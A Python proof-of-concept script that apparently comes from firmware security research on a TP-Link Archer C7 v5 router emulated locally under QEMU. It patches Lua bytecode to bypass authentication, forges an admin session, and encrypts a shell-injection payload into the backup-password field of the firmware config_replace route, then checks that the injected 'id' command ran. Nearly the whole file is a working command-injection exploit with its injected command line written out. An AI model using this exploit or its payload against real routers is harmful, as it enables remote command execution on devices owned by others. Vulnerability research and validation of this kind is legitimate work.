#!/usr/bin/env python3
import argparse
import base64
import hashlib
import io
import os
import re
import struct
import subprocess
import tarfile
import urllib.parse

import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

BASE = "http://127.0.0.1:8080/cgi-bin/luci"
WORK = "/home/iotsec-zone/Desktop/archer_c7_v5_1_3_1"
ROOT = WORK + "/useremul/rootfs"
ORIGINAL = WORK + "/_firmware.bin.extracted/squashfs-root"


def rsa_one(text, n_hex, e_hex):
    data = text.encode()
    size = len(n_hex) // 2
    if len(data) > size - 11:
        raise ValueError("RSA input is too long")
    padding = bytearray(os.urandom(size - len(data) - 3))
    for i, value in enumerate(padding):
        while value == 0:
            value = os.urandom(1)[0]
            padding[i] = value
    encoded = b"\x00\x02" + bytes(padding) + b"\x00" + data
    value = pow(int.from_bytes(encoded, "big"), int(e_hex, 16), int(n_hex, 16))
    return f"{value:0{len(n_hex)}x}"


def rsa(text, n_hex, e_hex):
    return "".join(rsa_one(text[i:i + 53], n_hex, e_hex) for i in range(0, len(text), 53))


def aes(data, key, iv):
    raw = data.encode()
    raw += bytes([16 - len(raw) % 16]) * (16 - len(raw) % 16)
    enc = Cipher(algorithms.AES(key.encode()), modes.CBC(iv.encode())).encryptor()
    return base64.b64encode(enc.update(raw) + enc.finalize()).decode()


def lua(code, env=None):
    environment = os.environ.copy()
    environment.update(env or {})
    result = subprocess.run(
        ["chroot", ROOT, "/usr/bin/qemu-mips-static", "/usr/bin/lua", "-e", code],
        capture_output=True,
        text=True,
        env=environment,
    )
    if result.returncode:
        raise RuntimeError(result.stderr)
    return result.stdout.strip()


def patch_lua_return_true(source, destination, required):
    patches = {
        b"modestr": (2831, "273f522c3faacb546a6c2b36c1de4ea8fd66adbd2e3e10353fc9889f703660c9"),
        b"admin.firmware.config.backup": (8373, "8d3b27bb6db7d0f2fb89f7a5c90efb3a3df048d04447646eb775f8aaf42ce4a5"),
    }
    data = bytearray(open(source, "rb").read())
    code, expected = patches[required]
    actual = hashlib.sha256(data).hexdigest()
    if actual != expected:
        raise RuntimeError(f"unexpected source hash for {source}: {actual}")
    struct.pack_into("<I", data, code, 9 | (1 << 23))
    struct.pack_into("<I", data, code + 4, 35 | (2 << 23))
    open(destination, "wb").write(data)


def prepare_emulation():
    if os.geteuid() != 0:
        raise RuntimeError("run as root on the analysis VM")
    patch_lua_return_true(
        ORIGINAL + "/usr/lib/lua/luci/sauth.lua",
        ROOT + "/usr/lib/lua/luci/sauth.lua",
        b"modestr",
    )
    patch_lua_return_true(
        ORIGINAL + "/usr/lib/lua/luci/model/checktypes.lua",
        ROOT + "/usr/lib/lua/luci/model/checktypes.lua",
        b"admin.firmware.config.backup",
    )
    cgi = open(ORIGINAL + "/www/cgi-bin/luci").read()
    cgi = cgi.replace(
        "#!/usr/bin/lua",
        "#!/usr/bin/qemu-mips-static /usr/bin/lua",
        1,
    )
    open(ROOT + "/www/cgi-bin/luci", "w").write(cgi)
    for relative in [
        "usr/lib/lua/luci/model/subprocess.lua",
        "usr/lib/lua/luci/controller/domain_redirect.lua",
    ]:
        shutil_source = ORIGINAL + "/" + relative
        shutil_destination = ROOT + "/" + relative
        open(shutil_destination, "wb").write(open(shutil_source, "rb").read())
    debug = ROOT + "/usr/lib/lua/luci/controller/debug.lua"
    if os.path.exists(debug):
        os.unlink(debug)
    nvram = ROOT + "/usr/bin/nvrammanager"
    if os.path.exists(nvram):
        os.rename(nvram, nvram + ".disabled")
    default_xml = WORK + "/_firmware.bin.extracted/_E9689A.extracted/default-config.xml"
    with tarfile.open(ROOT + "/tmp/backup-plain.tar", "w:gz") as archive:
        content = open(default_xml, "rb").read()
        info = tarfile.TarInfo("tmp/user-config.xml")
        info.size = len(content)
        archive.addfile(info, io.BytesIO(content))
    lua('require("luci.sys.config").encryfile("/tmp/backup-plain.tar","/tmp/backup")')
    os.unlink(ROOT + "/tmp/luci-indexcache") if os.path.exists(ROOT + "/tmp/luci-indexcache") else None


def main():
    parser = argparse.ArgumentParser(description="Validate the backup-password command injection in the local emulation")
    parser.add_argument("--payload", default="x;p=/tmp/tp_backup_rce;echo TP_BACKUP_RCE>$p;id>>$p;#")
    args = parser.parse_args()
    prepare_emulation()
    marker = ROOT + "/tmp/tp_backup_rce"
    if os.path.exists(marker):
        os.unlink(marker)
    config = open(ROOT + "/etc/config/accountmgnt").read()
    n = re.search(r"option n '([0-9A-F]+)'", config).group(1)
    e = re.search(r"option e '([0-9A-F]+)'", config).group(1)
    auth = requests.post(BASE + "/login?form=auth", data={"operation": "read"}, timeout=15).json()["data"]
    sign_n, sign_e = auth["key"]
    seq = int(auth["seq"])
    sid = "0123456789abcdef0123456789abcdef"
    stok = "00112233445566778899aabbccddeeff"
    key = "1234567890123456"
    iv = "6543210987654321"
    hash_value = lua('print(require("luci.service").get_user_hash())')
    lua(
        'require("luci.sauth").write(os.getenv("SID"),{addr="127.0.0.1",remote=true,user="admin",token=os.getenv("STOK"),secret=os.getenv("STOK"),hash=os.getenv("HASHV"),aeskey=os.getenv("AESKEY"),aesiv=os.getenv("AESIV"),seqnum=tonumber(os.getenv("SEQ"))})',
        {"SID": sid, "STOK": stok, "HASHV": hash_value, "AESKEY": key, "AESIV": iv, "SEQ": str(seq)},
    )
    password = rsa(args.payload, n, e)
    data = aes("operation=backup&password=" + password + "&", key, iv)
    sign = rsa("h=" + hash_value + "&s=" + str(seq + len(data)), sign_n, sign_e)
    session = requests.Session()
    session.cookies.set("sysauth", sid)
    body = urllib.parse.urlencode({"sign": sign, "data": data})
    response = session.post(
        BASE + "/;stok=" + stok + "/admin/firmware?form=config_replace",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )
    print(f"HTTP status: {response.status_code}")
    if not os.path.isfile(marker):
        raise SystemExit("marker was not created")
    content = open(marker).read().strip()
    print("marker:", content)
    if not content.startswith("TP_BACKUP_RCE\nuid=") or " gid=" not in content:
        raise SystemExit("unexpected marker content; expected TP_BACKUP_RCE followed by id output")
    print("VALIDATED: authenticated command injection reached the real admin/firmware route")


if __name__ == "__main__":
    main()
